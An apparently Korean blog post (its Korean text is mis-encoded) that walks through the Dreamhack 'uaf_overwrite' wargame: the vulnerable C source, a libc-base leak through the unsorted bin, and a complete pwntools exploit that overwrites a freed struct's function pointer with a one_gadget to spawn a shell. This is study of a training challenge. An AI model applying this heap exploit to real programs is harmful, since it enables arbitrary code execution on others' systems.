---
title:  "TIL: Use After Free ğŸ˜‡"
excerpt: "2022.08.11 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---

## Use After Free

**Use-After-Free**ëŠ” memory referenceë¥¼ ìœ„í•´ ì‚¬ìš©í•œ **pointer**ë¥¼ memory í•´ì œ í›„ì— **ì´ˆê¸°í™”**í•˜ì§€ ì•Šì•„ì„œ, ë˜ëŠ” **í•´ì œí•œ memory**ë¥¼ **ì´ˆê¸°í™”**í•˜ì§€ ì•Šê³  ë‹¤ìŒ chunkì— re-allocateí•´ì„œ ìƒê¸°ëŠ” ì·¨ì•½ì ì´ë‹¤.

`malloc`**ê³¼** `free`ëŠ” allocateí•˜ê±°ë‚˜ freeí•œ **memoryì˜ ë°ì´í„°ë¥¼ ì´ˆê¸°í™”í•˜ì§€ ì•ŠëŠ”ë‹¤**. â†’ ìƒˆë¡­ê²Œ í• ë‹¹í•œ chunkì— **ì´ì „ì— freeí•œ chunkì˜ dataê°€ ë‚¨ì•„ìˆì–´ ìœ ì¶œ**ë  ìˆ˜ ìˆë‹¤.

`ptmalloc2`ëŠ” ìƒˆë¡œìš´ allocate ìš”ì²­ì´ ë“¤ì–´ì™”ì„ ë•Œ **ìš”ì²­ëœ í¬ê¸°ì™€ ë¹„ìŠ·í•œ chunkê°€** `bin`**ì´ë‚˜** `tcache`**ì— ìˆëŠ”ì§€ í™•ì¸**í•˜ê³ , ë§Œì•½ ìˆë‹¤ë©´ **í•´ë‹¹ chunkë¥¼ ì¬ì‚¬ìš©**í•œë‹¤. â†’ ì•ì„œ freeí•œ memoryì™€ ê°™ì€ sizeë¡œ memoryë¥¼ allocateí•  ë•Œ **ì´ì „ì˜ ê°’ì´ ê·¸ëŒ€ë¡œ ë‚¨ì•„ìˆì„ ìˆ˜ ìˆë‹¤**.

## Wargame: [uaf_overwrite](https://dreamhack.io/wargame/challenges/357)

ë¬¸ì œì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

### Vulnerability Scanning

- `checksec`
    
    <p align="center">
		<a href="/assets/images/TIL220811/Untitled.png">
			<img src="/assets/images/TIL220811/Untitled.png" width="300">
   		 </a>
	</p>  
    
    ëª¨ë“  ë³´í˜¸ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆë‹¤.
    
- `Human`ê³¼ `Robot`ì˜ **í¬ê¸°ê°€ ë™ì¼**í•˜ë©°, ë‘ struct ëª¨ë‘ ê°ê° `human_func()`, `robot_func()`ì— ì˜í•´ allocate ë° freeë  ìˆ˜ ìˆë‹¤. â†’ **Use-After-Free** ë²„ê·¸ê°€ ë°œìƒí•  ìˆ˜ ìˆë‹¤.
    - íŠ¹íˆ `robot_func()`ì—ì„œ `Robot`ì˜ `fptr`ë¥¼ callí•˜ëŠ”ë°, ì´ë•Œ Use-After-Free ë²„ê·¸ë¥¼ ì´ìš©í•´ `fptr`**ì˜ ê°’ì„ ì¡°ì‘**í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ **ì›í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆë‹¤. â†’ **one_gadget**ì„ í™œìš©í•˜ì.
- **one_gadgetì˜ ì£¼ì†Œ**ë¥¼ êµ¬í•˜ê¸° ìœ„í•´ **code base**ë¥¼ êµ¬í•´ì•¼ í•˜ëŠ”ë°, ì´ë•Œ `custom_func`ë¥¼ í™œìš©í•œë‹¤. `custom_func`ë¥¼ í†µí•´ 0x100 ì´ìƒì˜ í¬ê¸°ì˜ chunkë¥¼ allocate ë° freeí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì´ í•¨ìˆ˜ì—ì„œë„ **Use-After-Free** ë²„ê·¸ê°€ ë°œìƒí•œë‹¤.

### Code base êµ¬í•˜ê¸°

[https://learn.dreamhack.io/119#5](https://learn.dreamhack.io/119#5)

[https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin#ì¢…ë¥˜](https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin#%EC%A2%85%EB%A5%98)

Code baseë¥¼ êµ¬í•˜ê¸° ìœ„í•´ **unsorted bin**ì˜ íŠ¹ì§•ì„ í™œìš©í•œë‹¤. 

- **Unsorted bin**ì— **ì²˜ìŒ ì—°ê²°ë˜ëŠ” chunk**ëŠ” libcì˜ íŠ¹ì • ì£¼ì†Œì™€ ì´ì¤‘ ì›í˜• linked listë¥¼ í˜•ì„±í•œë‹¤. ( = **ì²« ë²ˆì§¸ chunkì˜** `fd`, `bk`**ì—ëŠ” libc ë‚´ë¶€ì˜ ì£¼ì†Œê°€ ë“¤ì–´ìˆë‹¤.**) â†’ unsorted binì— ì—°ê²°ëœ chunkë¥¼ **re-allocate**í•˜ê³ , `fd`**ë‚˜** `bk`**ì˜ ê°’ì„ ì½ìœ¼ë©´** libcê°€ mappingëœ ì£¼ì†Œë¥¼ ê³„ì‚°í•  ìˆ˜ ìˆë‹¤.
- **0x410 ì´í•˜**ì˜ í¬ê¸°ì˜ chunkëŠ” **tcache**ì— ë¨¼ì € ì‚½ì…ë˜ë¯€ë¡œ ì´ë³´ë‹¤ í° chunkë¥¼ í•´ì œí•´ì„œ unsorted binì— ì—°ê²°í•˜ê³ , ì´ë¥¼ ì¬í• ë‹¹í•´ì„œ ê°’ì„ ì½ì–´ libcê°€ mappingëœ ì£¼ì†Œë¥¼ í™•ì¸í•˜ì.
- Freeí•  chunkê°€ **top chunk**ì™€ ë§ë‹¿ì•„ ìˆì„ ê²½ìš° freeí•  ë•Œ **ë‘ chunkê°€ coalesce**ë˜ë¯€ë¡œ **chunk ë‘ ê°œë¥¼ ì—°ì†ìœ¼ë¡œ allocateí•˜ê³ , ì²« ë²ˆì§¸ë¡œ allocateí•œ chunkë¥¼ free**í•´ì•¼ í•œë‹¤.

ì´ì œ ì‹¤ì œë¡œ libc_baseë¥¼ ì°¾ê³ , one_gadgetì˜ ì£¼ì†Œë¥¼ ì–»ì.

  - **libcì— mappingëœ ì£¼ì†Œ êµ¬í•˜ê¸°**

ì•ì„œ ì–¸ê¸‰í–ˆë“¯ì´ **ë‘ ê°œì˜ chunkë¥¼ allocate**í•˜ê³ , **ì²« ë²ˆì§¸ë¡œ allocateí•œ chunkë¥¼ free**í•œë‹¤. ì´í›„ **ê°™ì€ sizeì˜ chunkë¥¼ ë‹¤ì‹œ allocate**í•œ ë’¤ `fd`**ë‚˜** `bk`**ì˜ ê°’ì„ í™•ì¸**í•œë‹¤. ì„¸ ë²ˆì˜ `custom` ì‹¤í–‰ìœ¼ë¡œ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

gdbë¥¼ ì´ìš©í•´ ì„¸ ë²ˆì§¸ `custom` í•¨ìˆ˜ì˜ ì‹¤í–‰ ì „ì˜ `fd`ì˜ ê°’ì„ í™•ì¸í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ **0x7fd5db35dca0**ì„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. (gdbì˜ heap commandë¥¼ ì‚¬ìš©)

<p align="center">
	<a href="/assets/images/TIL220811/Untitled (1).png">
		<img src="/assets/images/TIL220811/Untitled (1).png" width="500">
   	 </a>
</p>

  - **ê·¸ ì£¼ì†Œê°€ ì–´ëŠ ê³³ì˜ ì£¼ì†Œì¸ì§€ í™•ì¸í•˜ê¸°**

gdbë¡œ ì´ ì£¼ì†Œê°€ **libc ì¤‘ ì–´ëŠ ê³³ì˜ ì£¼ì†Œì¸ì§€ë¥¼ í™•ì¸**í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ `main_arena+96`ì˜ ì£¼ì†Œì„ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

<p align="center">
	<a href="/assets/images/TIL220811/Untitled (2).png">
		<img src="/assets/images/TIL220811/Untitled (2).png" width="500">
   	 </a>
</p>

  - **ì£¼ì–´ì§„ versionì˜ libcì—ì„œ offset í™•ì¸í•˜ê¸°**

[https://d41jung0d.tistory.com/114](https://d41jung0d.tistory.com/114)

ì£¼ì–´ì§„ versionì˜ libcì˜ offsetì„ í™•ì¸í•˜ê¸° ìœ„í•´ `main_arena` symbolì„ libcì—ì„œ ì°¾ì•„ë³´ì•˜ì§€ë§Œ, ì°¾ì„ ìˆ˜ ì—†ì—ˆë‹¤. 

ê²€ìƒ‰ì„ í†µí•´ `main_arena`**ëŠ”** `__malloc_hook` **+ 0x10ì— ìœ„ì¹˜**í•œë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œ ìˆ˜ ìˆì—ˆìœ¼ë¯€ë¡œ [libc.rip](http://libc.rip)ì—ì„œ ì£¼ì–´ì§„ libcì˜ `__malloc_hook`**ì˜ offsetì„ í™•ì¸**í•˜ê³ , ì´ ê°’ì— **0x10ì„ ë”í•´ì£¼ë©´** ëœë‹¤. (ì¶”ê°€ë¡œ `main_arena`ëŠ” **64 bit machine**ì—ì„œëŠ” `__malloc_hook` **+ 0x10**ì—, **32 bit machine**ì—ì„œëŠ” `__malloc_hook` **+ 0x18**ì— ìœ„ì¹˜í•œë‹¤.)

<p align="center">
	<a href="/assets/images/TIL220811/Untitled (3).png">
		<img src="/assets/images/TIL220811/Untitled (3).png" width="500">
   	 </a>
</p>

ë¬¸ì œì—ì„œ ì£¼ì–´ì§„ libcì—ì„œëŠ” `__malloc_hook`ì˜ offsetì´ 0x3ebc30ì´ë¯€ë¡œ `main_arena`**ì˜ offsetì€ 0x3ebc40**ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.

  - **overwriteëœ ë¶€ë¶„ ê³ ë ¤í•˜ê¸°**

ê·¸ëŸ°ë° ì´ë•Œ ì„¸ ë²ˆì§¸ `custom` í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ë•Œ `"B"`ì„ dataë¡œ ì…ë ¥í•˜ê¸° ë•Œë¬¸ì— `fd`**ì˜ ë§ˆì§€ë§‰ í•œ ë°”ì´íŠ¸ê°€ 0x42ë¡œ overwrite**ë˜ê²Œ ëœë‹¤. ë”°ë¼ì„œ `printf`ë¡œ ì¶œë ¥ë˜ëŠ” ê°’ì€ **0x7fd5db35dc42**ê°€ ëœë‹¤. **libcì— mappingëœ ì£¼ì†ŒëŠ” í•˜ìœ„ 1.5 byteê°€ ì¼ì •**í•˜ë¯€ë¡œ, **0x42 - 0xa0ë§Œí¼ ê°’ì´ ë”í•´ì¡Œë‹¤**ê³  ìƒê°í•˜ë©´ ëœë‹¤.

  - **libc_base êµ¬í•˜ê¸°**

ì¶œë ¥ê°’ì´ ë‚˜ì˜¤ê¸° ìœ„í•œ ê³¼ì •ì„ ë˜ëŒì•„ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ì •ë¦¬í•  ìˆ˜ ìˆë‹¤:

**ì¶œë ¥ê°’ = libc_base + 0x3ebc40 + 96 - 0xa0 + 0x42**

ë”°ë¼ì„œ **libc_base** = ì¶œë ¥ê°’ - 0x3ebc40 - 96 + 0xa0 - 0x42 = **ì¶œë ¥ê°’ - 0x3ebc42**

ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì´ exploití•˜ë©´ libc_baseë¥¼ êµ¬í•  ìˆ˜ ìˆê³ , ì´ë¡œë¶€í„° one_gadgetì˜ ì£¼ì†Œë„ êµ¬í•  ìˆ˜ ìˆë‹¤. one_gadgetì˜ offsetì€ `one_gadget`ì„ ì´ìš©í•´ êµ¬í–ˆë‹¤.

```python
from pwn import *
p = process("./uaf_overwrite")

def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))

custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42
og = libc_base + 0x10a41c
```

### Exploit

```python
from pwn import *

p = remote("host3.dreamhack.games", 15336)

def human(weight, age):
    p.sendlineafter(">", "1")
    p.sendlineafter(": ", str(weight))
    p.sendlineafter(": ", str(age))

def robot(weight):
    p.sendlineafter(">", "2")
    p.sendlineafter(": ", str(weight))

def custom(size, data, idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(": ", str(size))
    p.sendafter(": ", data)
    p.sendlineafter(": ", str(idx))

custom(0x500, "AAAA", -1)
custom(0x500, "AAAA", 0)
custom(0x500, "B", -1)

# local, remote:
libc_base = u64(p.recvline()[:-1].ljust(8, b"\x00")) - 0x3ebc42
# remote:
og = libc_base + 0x10a41c
# local:
#og = libc_base + 0x10a2fc
print("libc_base: ", hex(libc_base))
print("og: ", hex(og))

human("1", og)
robot("1")

p.interactive()
```

- one_gadgetì˜ ì£¼ì†Œë¥¼ `human_func`ë¥¼ ì´ìš©í•´ `human`ì˜ `age`ì— ë„£ëŠ”ë‹¤. `human`**ì´ freeë˜ì–´ë„ ì´ ê°’ì€ ë‚¨ì•„ ìˆìœ¼ë¯€ë¡œ (Use-After-Free)** `robot_func`ë¥¼ ì‹¤í–‰í–ˆì„ ë•Œ one_gadgetì´ ì‹¤í–‰ëœë‹¤.

### ì•„ì§ ì™„ì „íˆ ì´í•´í•˜ì§€ ëª»í•œ ì ë“¤

- heapì— ëŒ€í•´ ê¹Šê²Œ ê³µë¶€í•œ ì ì´ ì—†ì–´ unsorted bin, tcacheì™€ ê°™ì€ ìš©ì–´ë“¤ì„ ì²˜ìŒ ë“¤ì–´ë´¤ëŠ”ë°, ë‚˜ì¤‘ì— ì‹œê°„ì´ ë˜ë©´ **heapì— ëŒ€í•´ì„œë„ ê³µë¶€í•´ì•¼ í•¨**.
- 0x3ebc42ë¼ëŠ” offsetì´ ë‹¤í–‰íˆ remoteì—ì„œë„ ì ìš©ì´ ë˜ì—ˆëŠ”ë°, ë§Œì•½ ì ìš©ë˜ì§€ ì•Šì•˜ìœ¼ë©´ ì–´ë–»ê²Œ êµ¬í•´ì•¼ í–ˆì„ì§€ ì˜ ëª¨ë¥´ê² ìŒ. ë¬¸ì œì—ì„œ ì‚¬ìš©ëœ ë²„ì „ì˜ **libc íŒŒì¼ì´ ì£¼ì–´ì¡Œì„ ë•Œ**, ì´ libc íŒŒì¼ì—ì„œ **ì›í•˜ëŠ” symbolì˜ offsetì„ ì–´ë–»ê²Œ êµ¬í•˜ëŠ”ê±´ì§€ ì˜ ëª¨ë¥´ê² ë‹¤**.